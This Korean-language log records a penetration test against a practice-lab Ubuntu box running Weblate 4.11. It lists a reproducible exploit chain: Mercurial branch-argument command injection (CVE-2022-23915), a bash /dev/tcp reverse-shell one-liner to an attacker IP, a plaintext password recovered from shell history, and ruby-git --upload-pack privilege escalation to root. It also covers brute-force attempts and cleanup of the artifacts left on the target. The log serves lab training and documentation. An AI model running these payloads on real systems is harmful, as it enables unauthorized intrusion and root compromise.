# Fikklish — 실행 기록 (2026-08-20)

타겟 192.168.248.19 · Ubuntu 22.04 · PG Practice Fundamental · **완료 2/2**
노트: `03. PG\Fikklish.md` (489행) · 산출물: Kali `~/PG/Fikklish/`

## 타임라인 요약

| 시각(KST) | 사건 |
|---|---|
| 18:26 | nmap `-p-` 시작. 22 / 80 / 8000 만 열림 (나머지 65531 filtered), UDP top-100 무응답 |
| 18:27 | 80 = FreeHTML5 정적 서점 템플릿, 8000 = Weblate 4.11 (근거 3개 교차) |
| 18:31 | `/api/users/` 익명 열람 → 사용자는 `anonymous`·`admin` 둘뿐, 프로젝트 0개 |
| 18:32 | 로그인 브루트 시도 → 5회 만에 IP 락아웃. 이후 45분을 여기서 태움 |
| 18:43 | Django `DEBUG=True` 확인, `/media/` 트래버설로 technical 500 확보 → OS 사용자 `tom`, 전체 설정 |
| 18:34~19:12 | 가입 확인메일 가로채기 시도 (SMTP 캐처, 브래킷 IP, nip.io/sslip.io) — **전부 실패** |
| 19:15 | cewl 348단어. Editors Note 가 지목한 고유명사로 후보 축소 |
| 19:19 | `admin:niffenegger` 로그인 성공(302) |
| 19:19 | CVE-2022-23915 (hg `--config=alias.pull=!cmd`) → ICMP 콜백 확인 |
| 19:23 | 443 리버스셸 → `tom` |
| 19:26 | SSH 키 안정화, user flag |
| 19:27 | `.psql_history` 평문 비번 → `sudo -l` 노출 |
| 19:28 | CVE-2022-25648 (ruby-git 1.10.2 `--upload-pack=`) → root, root flag |
| 19:29~19:33 | harvest 2레벨 · 스크린샷 · 흔적기록 · 타겟/Kali 정리 |

착수 → root 까지 **62분**. 그 중 **72분 상당의 시행착오**(중첩 포함)가 로그인 전에 몰려 있다.

## 익스플로잇 경로 (재현 최소 단위)

1. `http://192.168.248.19/` 본문의 "Editors Note" → `admin:niffenegger`
2. `/create/project/` (poc) → `/create/component/`
   - `vcs=mercurial`, `repo=http://localhost:8000`
   - `branch=--config=alias.pull=!<cmd>`
   - 컴포넌트 생성은 실패하지만 명령은 그 전에 실행된다
3. `bash -c 'bash -i >& /dev/tcp/192.168.45.207/443 0>&1'` → tom
4. `/home/tom/.psql_history` → `RapidlyLockstepDrenched103` (tom 의 시스템 비번)
5. `sudo /home/tom/fetch.rb` 입력 3줄 중 하나에 `--upload-pack=sh /tmp/r.sh` → root

스크립트: `~/PG/Fikklish/wl_rce.py` (로그인+프로젝트+컴포넌트 자동화), `privesc.sh`, `cleanup.sh`, `wl_cleanup.py`

## 실패 로그 (전량 보존)

| 파일 | 내용 |
|---|---|
| `try1_hydra_theme.log` | SSH 브루트, 테마 단어 31개 × 4계정 — 실패 |
| `try2_hydra_cewl.log` | SSH 브루트, cewl 348단어 — 실패 |
| `regloop.log` | 가입 재시도 루프. 락아웃 연장만 초래해 중단 |
| `smtp_capture.log` | 25번 캐처. swaks 자체시험 1건 외 **타겟 접속 0건** |
| `reg_smtp.pcap` | tun0, 타겟의 80/8000 외 트래픽 — 0패킷 |
| `nmap_udp.log` | UDP top-100 전부 open\|filtered |
| `gobuster_80.txt` / `gobuster_80_big.txt` | 80번에서 나온 것은 정적 템플릿 파일뿐 |
| `hydra_theme.log` / `hydra_cewl.log` | hydra 결과파일(빈 상태 = 미발견) |

## 반증한 것 (근거 포함)

1. **"가입 확인메일을 우리 SMTP 로 가로챈다" 는 계획은 이 박스에서 성립하지 않는다.**
   root 로 확인한 결과 ① celery 워커 프로세스가 존재하지 않고(`harvest_root.txt` PROCS), Weblate 4.11 의 가입 메일은 `send_mails.delay()` 로 `notify` 큐에 들어간다. ② `ss -lntup` LISTEN 목록에 25번이 없다(exim4 패키지는 설치돼 있으나 데몬 미기동). 워커가 있었어도 `EMAIL_HOST=localhost:25` 는 연결 거부였다.
   같은 원인으로 **Weblate UI 의 프로젝트 삭제(`project_removal.delay`)도 동작하지 않아** ORM 으로 직접 지워야 했다.

2. **`/admin/login/` 은 Weblate 레이트리밋 우회로가 아니다.**
   Django 관리자 폼이 뜨길래 별도 경로로 기대했으나, `weblate/wladmin/sites.py` 가 `login_form = AdminLoginForm` 을 지정하고 `AdminLoginForm(LoginForm)` 이라 같은 `check_rate_limit("login")` 을 탄다. 존재하지 않는 계정 12회 시험으로 실측 확인(5회째부터 차단).

3. **레이트리밋 중 재시도는 대기시간을 늘린다.**
   `weblate/utils/ratelimit.py` 의 `check_rate_limit` 이 초과 시 `cache.set(key, attempts, LOCKOUT)` 으로 **타이머를 매번 새로 감는다.** 재시도 루프가 락아웃을 스스로 연장하고 있었다.

4. **`searchsploit weblate` 는 0건이다.** searchsploit 가 비었다고 공개 익스플로잇이 없는 것이 아니다. CVE 번호는 웹 검색으로만 나왔다.

## 계정 잠금 위험 (관리자 확인 필요 없음, 참고용)

Weblate 는 `AUTH_LOCK_ATTEMPTS=10` 으로, **마지막 성공 로그인 이후 실패 10회면 `set_unusable_password()`** 를 호출한다(`weblate/accounts/models.py`). 이번에 admin 상대로 실제 인증까지 도달한 실패는 **6회**(`admin`×2 · `badpasswordtest` · `TheTimeTravelersWife` · `thetimetravelerswife` · `Niffenegger`)였고 7번째 시도 `niffenegger` 로 성공했다. 레이트리밋에 막힌 시도는 `authenticate()` 에 도달하지 않아 카운트되지 않는다. 성공 로그인으로 카운터 기준점이 갱신됐으므로 현재 잔여 위험은 없다. 다만 **다음에 이 박스를 다시 켜서 브루트포스하면 3회 여유밖에 없다고 가정하지 말 것** — 리버트하면 초기화된다.

## harvest.sh 수정 (총괄 지시 이행)

`~/PG/_lib/harvest.sh` 의 SUDO 섹션에 `command -v sudo` 가드를 씌웠다.

```sh
if command -v sudo >/dev/null 2>&1; then
  sudo -n -l 2>&1 || echo "(sudo -n 실패 — 비밀번호 필요)"
  [ -n "$HARVEST_PW" ] && { echo "-- sudo -S -l (HARVEST_PW) --"; echo "$HARVEST_PW" | sudo -S -l 2>&1; }
else
  echo "(sudo 바이너리 없음 — PwnLab 류. 이 반사는 접어라)"
fi
```

- 백업: `~/PG/_lib/harvest.sh.bak-sudoguard` (기존 `.bak-lsa` · `.bak-envleak` 은 그대로 둠)
- `sh -n` 통과, 섹션 19개 유지 (`grep -c '^s [A-Z]'` = 19)
- **실행 확인**: `PATH` 에서 sudo 를 뺀 가짜 bin 디렉터리로 `env -i PATH=/tmp/fakebin HARVEST_PW=dummy sh harvest.sh` → **exit 0, stderr 없음**, SUDO 섹션에 폴백 문구 출력. 기존의 `sh: echo: I/O error` 사라짐.
- 실제 박스(sudo 있음)에서도 정상 동작 확인 — `harvest_tom.txt` 의 SUDO 섹션에 `sudo -S -l` 결과가 정상 기록됨.

## 산출물 목록 (Kali `~/PG/Fikklish/`)

정찰: `nmap.log` `nmap.full.txt` `nmap_quick.log` `nmap_udp.log` `gobuster_80.txt` `gobuster_80_big.txt` `index80.html` `README.txt` `api_users.json` `api_projects.json` `api_components.json` `login.html`
DEBUG 유출: `debug_traceback.html` (113KB) `settings_dump.txt` (413행)
사전: `cewl.txt` `pw_theme.txt` `users.txt` `rockyou20k.txt`
익스플로잇: `wl_rce.py` `privesc.sh` `trysudo.sh` `fik_key`/`fik_key.pub` `smtpcatch.py`
증거: `proof_user.txt` `proof_root.txt` `icmp.log` `harvest_tom.txt` `harvest_root.txt` `traces_confirmed.log`
실패: `try1_hydra_theme.log` `try2_hydra_cewl.log` `regloop.log` `smtp_capture.log` `reg_smtp.pcap` `hydra_theme.log` `hydra_cewl.log`
스크린샷: `shot_80_site.png` `shot_8000_weblate.png` `shot_8000_debug.png`
메모: `writeup_notes.txt` (61행, 시간순)
정리: `cleanup.sh` `wl_cleanup.py` `traces.sh`

볼트 반입 스크린샷 3장: `파일보관\PG-Fikklish-port80-hint.png` · `PG-Fikklish-weblate411.png` · `PG-Fikklish-django-debug.png`

## 정리 상태

- 타겟: Weblate 프로젝트/컴포넌트 삭제(ORM), vcs 디렉터리 2개 삭제, `/home/tom/.ssh` 삭제, `/root/.ssh/authorized_keys` 삭제, `/root/projects` 삭제, `/tmp` 업로드물 6종 + `/tmp/.h` 삭제, `/root/{h,traces,cleanup}.sh` 삭제. 전부 `ls` 로 사후 확인.
- 로그는 **지우지 않았다.** `auth.log` 에 `COMMAND=/home/tom/fetch.rb` 가 남아 있고, `btmp` 에 실패 SSH 10건, `wtmp` 에는 `ssh -tt` 로 연 2세션만 남았다(비대화형 `ssh host 'cmd'` 는 pty 를 안 열어 wtmp 에 안 남는다).
- Kali: `fik_*` tmux 8개 종료, 25번 SMTP 캐처·tcpdump 를 PID 지정 종료. **다른 세션 소유의 `pwnlab_shell` 과 그 443 리스너는 손대지 않았다** — 1시간 45분째 살아 있는 남의 프로세스였고, 그것 때문에 내 첫 리스너가 포트를 못 잡아 6분을 태웠다.
